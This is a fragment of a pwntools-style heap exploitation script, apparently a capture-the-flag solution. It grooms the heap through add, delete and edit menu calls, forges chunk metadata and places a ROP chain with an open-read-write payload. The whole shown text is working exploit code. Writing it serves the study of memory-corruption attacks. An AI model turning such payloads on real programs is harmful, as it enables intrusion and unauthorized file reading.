...
rop = cyclic(0x80) + p64(heap_base+0x3810-8) + p64(leave)

payload = p64(heap_base+0xA50)*2
add(0, 3, payload)
add(0, 4, b'0')
add(1, 4, b'1')
dele(0)
add(1, 3, b'1')
add(2, 3, b'2')
payload = orw.ljust(0x300, b'\x00') + p64(0) + p64(0x101) + p64(heap_base+0x36E0) + p64(heap_base+0x33D0)
edit(0, payload)
